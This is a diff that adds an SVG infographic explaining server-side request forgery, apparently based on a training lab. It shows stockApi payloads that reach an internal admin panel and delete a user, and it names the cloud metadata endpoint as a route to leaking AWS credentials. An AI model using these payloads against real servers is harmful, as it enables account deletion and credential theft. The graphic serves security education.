@@ -1,0 +1,50 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 820 452" font-family="ui-monospace, SFMono-Regular, Menlo, monospace">
+  <defs>
+    <linearGradient id="sbg" x1="0" y1="0" x2="1" y2="1">
+      <stop offset="0" stop-color="#0d1117"/><stop offset="1" stop-color="#161b22"/>
+    </linearGradient>
+  </defs>
+  <rect width="820" height="452" rx="14" fill="url(#sbg)"/>
+  <rect x="0" y="0" width="820" height="52" rx="14" fill="#b34700"/>
+  <rect x="0" y="38" width="820" height="14" fill="#b34700"/>
+  <circle cx="26" cy="26" r="6" fill="#ff5f56"/>
+  <circle cx="46" cy="26" r="6" fill="#ffbd2e"/>
+  <circle cx="66" cy="26" r="6" fill="#27c93f"/>
+  <text x="410" y="31" fill="#ffffff" font-size="17" font-weight="700" text-anchor="middle">SSRF · server-side request forgery</text>
+
+  <text x="34" y="90" fill="#8b949e" font-size="13">1 · "Check stock" sends a URL the server will fetch. Hijack it:</text>
+  <rect x="30" y="102" width="760" height="40" rx="8" fill="#010409" stroke="#f0883e"/>
+  <text x="46" y="128" font-size="14.5"><tspan fill="#6e7681">POST /product/stock &#8195; stockApi=</tspan><tspan fill="#ffa657" font-weight="700">http://localhost/admin</tspan></text>
+
+  <!-- flow -->
+  <g font-size="12.5">
+    <rect x="40" y="168" width="150" height="54" rx="8" fill="#161b22" stroke="#30363d"/>
+    <text x="115" y="192" fill="#c9d1d9" text-anchor="middle" font-weight="700">You</text>
+    <text x="115" y="210" fill="#6e7681" text-anchor="middle">(the internet)</text>
+
+    <rect x="335" y="168" width="150" height="54" rx="8" fill="#161b22" stroke="#30363d"/>
+    <text x="410" y="192" fill="#c9d1d9" text-anchor="middle" font-weight="700">The server</text>
+    <text x="410" y="210" fill="#6e7681" text-anchor="middle">trusted position</text>
+
+    <rect x="630" y="168" width="150" height="54" rx="8" fill="#0f2417" stroke="#238636"/>
+    <text x="705" y="192" fill="#3fb950" text-anchor="middle" font-weight="700">localhost/admin</text>
+    <text x="705" y="210" fill="#6e7681" text-anchor="middle">internal only</text>
+
+    <line x1="190" y1="195" x2="333" y2="195" stroke="#58a6ff" stroke-width="1.5"/>
+    <text x="262" y="188" fill="#58a6ff" text-anchor="middle">request</text>
+    <line x1="485" y1="195" x2="628" y2="195" stroke="#3fb950" stroke-width="1.5"/>
+    <text x="556" y="188" fill="#3fb950" text-anchor="middle">fetches &#10003;</text>
+    <path d="M190 240 H628" stroke="#f85149" stroke-width="1.5" stroke-dasharray="5 4"/>
+    <text x="409" y="234" fill="#f85149" text-anchor="middle">you can't reach it directly &#10007; &#8212; but the server can</text>
+  </g>
+
+  <text x="34" y="286" fill="#8b949e" font-size="13">2 · Point it at the admin delete endpoint the panel revealed:</text>
+  <rect x="30" y="298" width="760" height="40" rx="8" fill="#010409" stroke="#30363d"/>
+  <text x="46" y="324" font-size="14.5"><tspan fill="#6e7681">stockApi=</tspan><tspan fill="#3fb950" font-weight="700">http://localhost/admin/delete?username=carlos</tspan></text>
+
+  <rect x="30" y="356" width="760" height="70" rx="10" fill="#2a1721" stroke="#f85149"/>
+  <text x="52" y="382" font-size="15" fill="#ff7b72" font-weight="700">Real-world impact</text>
+  <text x="52" y="402" font-size="12.5" fill="#c9d1d9">Aim at cloud metadata &#8212; http://169.254.169.254/latest/meta-data/ &#8212; and the</text>
+  <text x="52" y="419" font-size="12.5" fill="#c9d1d9">server leaks its AWS credentials. (This was the Capital One breach.)</text>
+  <text x="705" y="394" font-size="13" fill="#3fb950" font-weight="700" text-anchor="middle">SOLVED &#10003;</text>
+</svg>
